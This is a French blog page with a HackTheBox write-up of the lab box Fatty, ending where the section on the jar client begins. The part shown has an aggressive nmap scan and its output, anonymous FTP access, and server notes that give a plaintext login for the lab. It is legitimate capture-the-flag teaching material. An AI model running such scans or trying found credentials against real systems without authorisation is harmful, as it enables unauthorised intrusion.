<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="fr">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>HackTheBox - Fatty Write-Up - La sécurité à la française</title><meta name="author" content="Driikolu">
<meta name="description" content="Durant le confinement, j&rsquo;étais particulièrement actif sur HackTheBox. Ayant fait toutes les boxs que je jugeait &ldquo;à ma portée&rdquo; à un moment je m&rsquo;étais lancé dans la quête (qui me paraissait impossible) d&rsquo;une box notée Insane !
Ainsi j&rsquo;ai réussi Fatty non sans difficulté. J&rsquo;ai trouvé l&rsquo;expérience assez intéréssante pour en faire un Write-Up que vous pouvez lire juste en dessous !
Trouver un point d&rsquo;entrée 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 sudo nmap -p 0-10000 -T5 -Pn -O -sV 10.10.10.174 Nmap scan report for 10.10.10.174 Host is up (0.039s latency). Not shown: 9996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u7 (protocol 2.0) 1337/tcp open ssl/waste? 1338/tcp open ssl/wmc-log-svc? 1339/tcp open ssl/kjtsiteserver? 3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1337-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu SF:x-gnu%r(NULL,80,&#34;\xe4\xdb\xb8\xe4_\x13\x96T\t\xf3r\xa7m\xc8h\x87\xc8\xf &lt;REDACTED&gt; ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1338-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu SF:x-gnu%r(NULL,80,&#34;C\xec\&#34;r\xfd\x89}\|\x1d\xddW\x1b\xf8ux\xf6\x15B\xf4\x9 &lt;REDACTED&gt; ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1339-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu SF:x-gnu%r(NULL,80,&#34;\&#34;\.\x0b\xb1\xcfd\x1a\xc3\x9c\xce\0\xd7\x982\xac\x99\x &lt;REDACTED&gt; Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux 3.16 (94%), Linux 3.18 (94%), Linux 3.8 - 3.11 (94%), Linux 4.4 (94%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel On peut voir :
"><meta name="keywords" content='Hugo, FixIt'>
  <meta itemprop="name" content="HackTheBox - Fatty Write-Up">
  <meta itemprop="description" content="Durant le confinement, j’étais particulièrement actif sur HackTheBox. Ayant fait toutes les boxs que je jugeait “à ma portée” à un moment je m’étais lancé dans la quête (qui me paraissait impossible) d’une box notée Insane !
Ainsi j’ai réussi Fatty non sans difficulté. J’ai trouvé l’expérience assez intéréssante pour en faire un Write-Up que vous pouvez lire juste en dessous !
Trouver un point d’entrée 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 sudo nmap -p 0-10000 -T5 -Pn -O -sV 10.10.10.174 Nmap scan report for 10.10.10.174 Host is up (0.039s latency). Not shown: 9996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u7 (protocol 2.0) 1337/tcp open ssl/waste? 1338/tcp open ssl/wmc-log-svc? 1339/tcp open ssl/kjtsiteserver? 3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1337-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu SF:x-gnu%r(NULL,80,&#34;\xe4\xdb\xb8\xe4_\x13\x96T\t\xf3r\xa7m\xc8h\x87\xc8\xf &lt;REDACTED&gt; ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1338-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu SF:x-gnu%r(NULL,80,&#34;C\xec\&#34;r\xfd\x89}\|\x1d\xddW\x1b\xf8ux\xf6\x15B\xf4\x9 &lt;REDACTED&gt; ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1339-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu SF:x-gnu%r(NULL,80,&#34;\&#34;\.\x0b\xb1\xcfd\x1a\xc3\x9c\xce\0\xd7\x982\xac\x99\x &lt;REDACTED&gt; Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux 3.16 (94%), Linux 3.18 (94%), Linux 3.8 - 3.11 (94%), Linux 4.4 (94%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel On peut voir :">
  <meta itemprop="datePublished" content="2020-08-09T12:00:00+00:00">
  <meta itemprop="dateModified" content="2025-07-11T11:49:04+02:00">
  <meta itemprop="wordCount" content="3192"><meta property="og:url" content="https://driikolu.fr/posts/fatty-wu/">
  <meta property="og:site_name" content="La sécurité à la française">
  <meta property="og:title" content="HackTheBox - Fatty Write-Up">
  <meta property="og:description" content="Durant le confinement, j’étais particulièrement actif sur HackTheBox. Ayant fait toutes les boxs que je jugeait “à ma portée” à un moment je m’étais lancé dans la quête (qui me paraissait impossible) d’une box notée Insane !
Ainsi j’ai réussi Fatty non sans difficulté. J’ai trouvé l’expérience assez intéréssante pour en faire un Write-Up que vous pouvez lire juste en dessous !
Trouver un point d’entrée 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 sudo nmap -p 0-10000 -T5 -Pn -O -sV 10.10.10.174 Nmap scan report for 10.10.10.174 Host is up (0.039s latency). Not shown: 9996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u7 (protocol 2.0) 1337/tcp open ssl/waste? 1338/tcp open ssl/wmc-log-svc? 1339/tcp open ssl/kjtsiteserver? 3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1337-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu SF:x-gnu%r(NULL,80,&#34;\xe4\xdb\xb8\xe4_\x13\x96T\t\xf3r\xa7m\xc8h\x87\xc8\xf &lt;REDACTED&gt; ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1338-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu SF:x-gnu%r(NULL,80,&#34;C\xec\&#34;r\xfd\x89}\|\x1d\xddW\x1b\xf8ux\xf6\x15B\xf4\x9 &lt;REDACTED&gt; ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1339-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu SF:x-gnu%r(NULL,80,&#34;\&#34;\.\x0b\xb1\xcfd\x1a\xc3\x9c\xce\0\xd7\x982\xac\x99\x &lt;REDACTED&gt; Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux 3.16 (94%), Linux 3.18 (94%), Linux 3.8 - 3.11 (94%), Linux 4.4 (94%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel On peut voir :">
  <meta property="og:locale" content="fr">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2020-08-09T12:00:00+00:00">
    <meta property="article:modified_time" content="2025-07-11T11:49:04+02:00">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="HackTheBox - Fatty Write-Up">
  <meta name="twitter:description" content="Durant le confinement, j’étais particulièrement actif sur HackTheBox. Ayant fait toutes les boxs que je jugeait “à ma portée” à un moment je m’étais lancé dans la quête (qui me paraissait impossible) d’une box notée Insane !
Ainsi j’ai réussi Fatty non sans difficulté. J’ai trouvé l’expérience assez intéréssante pour en faire un Write-Up que vous pouvez lire juste en dessous !
Trouver un point d’entrée 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 sudo nmap -p 0-10000 -T5 -Pn -O -sV 10.10.10.174 Nmap scan report for 10.10.10.174 Host is up (0.039s latency). Not shown: 9996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u7 (protocol 2.0) 1337/tcp open ssl/waste? 1338/tcp open ssl/wmc-log-svc? 1339/tcp open ssl/kjtsiteserver? 3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1337-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu SF:x-gnu%r(NULL,80,&#34;\xe4\xdb\xb8\xe4_\x13\x96T\t\xf3r\xa7m\xc8h\x87\xc8\xf &lt;REDACTED&gt; ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1338-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu SF:x-gnu%r(NULL,80,&#34;C\xec\&#34;r\xfd\x89}\|\x1d\xddW\x1b\xf8ux\xf6\x15B\xf4\x9 &lt;REDACTED&gt; ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1339-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu SF:x-gnu%r(NULL,80,&#34;\&#34;\.\x0b\xb1\xcfd\x1a\xc3\x9c\xce\0\xd7\x982\xac\x99\x &lt;REDACTED&gt; Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux 3.16 (94%), Linux 3.18 (94%), Linux 3.8 - 3.11 (94%), Linux 4.4 (94%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel On peut voir :">
      <meta name="twitter:site" content="@driikolu">
<meta name="twitter:creator" content="@driikolu" /><meta name="application-name" content="Hugo FixIt Blog">
<meta name="apple-mobile-web-app-title" content="Hugo FixIt Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://driikolu.fr/posts/fatty-wu/" title="HackTheBox - Fatty Write-Up - La sécurité à la française" /><link rel="prev" type="text/html" href="https://driikolu.fr/posts/install_arch_uefi/" title="Installation d&#39;Archlinux en UEFI &amp; chiffré" /><link rel="next" type="text/html" href="https://driikolu.fr/posts/word_worker_wu/" title="BreizhCTF 2022 - Word Worker" /><link rel="alternate" type="text/markdown" href="https://driikolu.fr/posts/fatty-wu/index.md" title="HackTheBox - Fatty Write-Up - La sécurité à la française"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "HackTheBox - Fatty Write-Up",
    "inLanguage": "fr",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/driikolu.fr\/posts\/fatty-wu\/"
    },"genre": "posts","wordcount":  3192 ,
    "url": "https:\/\/driikolu.fr\/posts\/fatty-wu\/","datePublished": "2020-08-09T12:00:00+00:00","dateModified": "2025-07-11T11:49:04+02:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Driikolu"
      },"description": ""
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="La sécurité à la française"><img class="logo" src='favicon.ico' alt="La sécurité à la française" height="32" width="32"><span class="header-title-text">La sécurité à la française</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Chercher">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Effacer">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="Changer de Thème">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="La sécurité à la française"><img class="logo" src='favicon.ico' alt="La sécurité à la française" height="26" width="26"><span class="header-title-text">La sécurité à la française</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Chercher">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Effacer">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Annuler
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Changer de Thème"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>HackTheBox - Fatty Write-Up</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="https://x.com/driikolu" title="Auteur"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img class="avatar" src='https://driikolu.fr/img/sloth.jpg' alt="Driikolu" height="16" width="16">&nbsp;Driikolu</a></span></div><div class="post-meta-line"><span title="publié le 2020-08-09 12:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2020-08-09">2020-08-09</time></span>&nbsp;<span title="Mis à jour le 2025-07-11 11:49:04"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-07-11">2025-07-11</time></span>&nbsp;<span title="3192 mots"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>environ 3200 mots</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>15 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contenus</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#le-ftp">Le FTP</a></li>
  </ul>

  <ul>
    <li><a href="#réussir-à-se-connecter">Réussir à se connecter</a></li>
    <li><a href="#obtenir-le-code-du-serveur">Obtenir le code du serveur</a></li>
    <li><a href="#obtenir-plus-de-droits">Obtenir plus de droits</a></li>
    <li><a href="#obtenir-un-accès-sur-le-serveur">Obtenir un accès sur le serveur</a></li>
  </ul>

  <ul>
    <li><a href="#obtenir-un-meilleur-shell">Obtenir un meilleur shell</a></li>
    <li><a href="#trouver-le-point-dentrée">Trouver le point d&rsquo;entrée</a></li>
    <li><a href="#obtenir-un-shell-root">Obtenir un shell root</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>Durant le confinement, j&rsquo;étais particulièrement actif sur HackTheBox. Ayant fait toutes les boxs que je jugeait &ldquo;à ma portée&rdquo; à un moment je m&rsquo;étais lancé dans la quête (qui me paraissait impossible) d&rsquo;une box notée <em>Insane</em> !</p>
<p>Ainsi j&rsquo;ai réussi <strong>Fatty</strong> non sans difficulté. J&rsquo;ai trouvé l&rsquo;expérience assez intéréssante pour en faire un Write-Up que vous pouvez lire juste en dessous !</p>
<h2 class="heading-element" id="trouver-un-point-dentrée"><span>Trouver un point d&rsquo;entrée</span>
  <a href="#trouver-un-point-dentr%c3%a9e" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -p 0-10000 -T5 -Pn -O -sV 10.10.10.174
</span></span><span class="line"><span class="cl">	Nmap scan report <span class="k">for</span> 10.10.10.174
</span></span><span class="line"><span class="cl">	Host is up <span class="o">(</span>0.039s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">	Not shown: <span class="m">9996</span> closed ports
</span></span><span class="line"><span class="cl">	PORT     STATE SERVICE            VERSION
</span></span><span class="line"><span class="cl">	21/tcp   open  ftp                vsftpd 2.0.8 or later
</span></span><span class="line"><span class="cl">	22/tcp   open  ssh                OpenSSH 7.4p1 Debian 10+deb9u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">	1337/tcp open  ssl/waste?
</span></span><span class="line"><span class="cl">	1338/tcp open  ssl/wmc-log-svc?
</span></span><span class="line"><span class="cl">	1339/tcp open  ssl/kjtsiteserver?
</span></span><span class="line"><span class="cl">	<span class="m">3</span> services unrecognized despite returning data. If you know the service/version, please 	submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">	<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
</span></span><span class="line"><span class="cl">	SF-Port1337-TCP:V<span class="o">=</span>7.80%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>4/4%Time<span class="o">=</span>5E88607F%P<span class="o">=</span>x86_64-unknown-linu
</span></span><span class="line"><span class="cl">	SF:x-gnu%r<span class="o">(</span>NULL,80,<span class="s2">&#34;\xe4\xdb\xb8\xe4_\x13\x96T\t\xf3r\xa7m\xc8h\x87\xc8\xf
</span></span></span><span class="line"><span class="cl"><span class="s2">	&lt;REDACTED&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">	==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
</span></span></span><span class="line"><span class="cl"><span class="s2">	SF-Port1338-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu
</span></span></span><span class="line"><span class="cl"><span class="s2">	SF:x-gnu%r(NULL,80,&#34;</span>C<span class="se">\x</span>ec<span class="se">\&#34;</span>r<span class="se">\x</span>fd<span class="se">\x</span>89<span class="o">}</span><span class="se">\|\x</span>1d<span class="se">\x</span>ddW<span class="se">\x</span>1b<span class="se">\x</span>f8ux<span class="se">\x</span>f6<span class="se">\x</span>15B<span class="se">\x</span>f4<span class="se">\x</span><span class="m">9</span>
</span></span><span class="line"><span class="cl">	&lt;REDACTED&gt;
</span></span><span class="line"><span class="cl">	<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
</span></span><span class="line"><span class="cl">	SF-Port1339-TCP:V<span class="o">=</span>7.80%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>4/4%Time<span class="o">=</span>5E88607F%P<span class="o">=</span>x86_64-unknown-linu
</span></span><span class="line"><span class="cl">	SF:x-gnu%r<span class="o">(</span>NULL,80,<span class="s2">&#34;\&#34;\.\x0b\xb1\xcfd\x1a\xc3\x9c\xce\0\xd7\x982\xac\x99\x
</span></span></span><span class="line"><span class="cl"><span class="s2">	&lt;REDACTED&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">	Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A
</span></span></span><span class="line"><span class="cl"><span class="s2">	or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux
</span></span></span><span class="line"><span class="cl"><span class="s2">	3.16 	(94%), Linux 3.18 (94%), Linux 3.8 - 3.11 (94%), Linux 4.4 (94%)
</span></span></span><span class="line"><span class="cl"><span class="s2">	No exact OS matches for host (test conditions non-ideal).
</span></span></span><span class="line"><span class="cl"><span class="s2">	Network Distance: 2 hops
</span></span></span><span class="line"><span class="cl"><span class="s2">	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span></span></code></pre></td></tr></table>
</div>
</div><p>On peut voir :</p>
<ul>
<li>1 service FTP (21)</li>
<li>1 service SSH (22)</li>
<li>3 services inconnus (1337,1338,1339)</li>
</ul>
<h2 class="heading-element" id="le-ftp"><span>Le FTP</span>
  <a href="#le-ftp" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Dans un premier temps, l&rsquo;option la plus logique est de tester une connexion anonyme au FTP.</p>
<p><img loading="lazy" src='/img/fatty_anonymous_ftp.png' alt="Connexion FTP en anonyme"></p>
<p>On a en effet un accès et quelques fichiers potentiellement intéréssants</p>
<ul>
<li>3 fichiers textes</li>
<li>1 fichier executable jar</li>
</ul>
<p>On s&rsquo;empresse de récupérer tous ces fichiers puis on lit les notes.</p>
<p><u>Note 1</u></p>
<blockquote>
<p>Dear members,</p>
<p>because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337.
Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice
if you use different servers from day to day to balance the server load.</p>
<p>We were too lazy to fix the default port in the &lsquo;.jar&rsquo; file, but since you are all senior java developers you should be capable of
doing it yourself ;)</p>
<p>Best regards,
qtc</p></blockquote>
<p><u>Note 2</u></p>
<blockquote>
<p>Dear members,</p>
<p>we are currently experimenting with new java layouts. The new client uses a static layout. If your
are using a tiling window manager or only have a limited screen size, try to resize the client window
until you see the login from.</p>
<p>Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11
per default, you may need to install it manually.</p>
<p>Best regards,
qtc</p></blockquote>
<p><u>Note 3</u></p>
<blockquote>
<p>Dear members,</p>
<p>We had to remove all other user accounts because of some seucrity issues.
Until we have fixed these issues, you can use my account:</p>
<p>User: qtc
Pass: clarabibi</p>
<p>Best regards,
qtc</p></blockquote>
<p>Bien&hellip; La suite se passe donc sur le client jar.</p>
<h2 class="heading-element" id="le-client-jar"><span>Le client jar</span>
  <a href="#le-client-jar" class="heading-mark">
